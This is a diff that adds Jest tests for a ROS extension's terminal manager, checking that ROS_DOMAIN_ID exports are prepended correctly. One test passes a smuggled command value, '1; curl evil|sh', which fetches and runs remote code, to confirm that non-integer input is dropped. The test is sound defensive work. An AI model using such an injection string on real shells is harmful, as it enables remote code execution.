@@ -148,6 +148,79 @@ describe('TerminalManager Integration Tests', () => {
       expect(terminal.name).toBe('ROS: test');
     });
 
+    describe('ROS_DOMAIN_ID terminal prefix', () => {
+      const workspace: WorkspaceInfo = {
+        id: '/test-ws',
+        name: 'test',
+        rootPath: { fsPath: '/test-ws' } as any,
+        srcPath: null,
+        installPath: null,
+        buildPath: null,
+        rosDistribution: null,
+        isValid: true,
+        errors: [],
+        warnings: []
+      };
+
+      afterEach(() => {
+        terminalManager.setDomainId(undefined);
+      });
+
+      it('prepends export ROS_DOMAIN_ID when a domain is set', async () => {
+        terminalManager.setDomainId(3);
+        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2');
+        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
+        expect(sent).toContain('export ROS_DOMAIN_ID=3 &&');
+      });
+
+      it('keeps the export across sourcing: source first, then export, then command', async () => {
+        const validWorkspacePath = path.join(FIXTURES_ROOT, 'workspace-valid');
+        const validWs: WorkspaceInfo = {
+          ...workspace,
+          rootPath: { fsPath: validWorkspacePath } as any,
+          installPath: { fsPath: path.join(validWorkspacePath, 'install') } as any
+        };
+        terminalManager.setDomainId(2);
+        const terminal = await terminalManager.executeInNewTerminal('rviz2', validWs, 'RVIZ2');
+        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
+        expect(sent).toMatch(/^source ".+" && export ROS_DOMAIN_ID=2 && rviz2$/m);
+      });
+
+      it('sends the plain command when no domain is set', async () => {
+        terminalManager.setDomainId(undefined);
+        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2');
+        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
+        expect(sent).not.toContain('ROS_DOMAIN_ID');
+        expect(sent).toContain('rviz2');
+      });
+
+      it('options.domainId overrides the global domain for this terminal', async () => {
+        terminalManager.setDomainId(1);
+        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2', { domainId: 5 });
+        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
+        expect(sent).toContain('export ROS_DOMAIN_ID=5 &&');
+        expect(sent).not.toContain('ROS_DOMAIN_ID=1');
+        terminalManager.setDomainId(undefined);
+      });
+
+      it('options.domainId undefined falls back to the global domain', async () => {
+        terminalManager.setDomainId(1);
+        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2', { source: true });
+        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
+        expect(sent).toContain('export ROS_DOMAIN_ID=1 &&');
+        terminalManager.setDomainId(undefined);
+      });
+
+      it('ignores non-integer domains instead of writing them into the shell line', async () => {
+        const hostile = '1; curl evil|sh' as unknown as number;
+        terminalManager.setDomainId(hostile);
+        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2');
+        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
+        expect(sent).not.toContain('ROS_DOMAIN_ID');
+        expect(sent).toContain('rviz2');
+      });
+    });
+
     it('build command execution', async () => {
       const validWorkspacePath = path.join(FIXTURES_ROOT, 'workspace-valid');
       
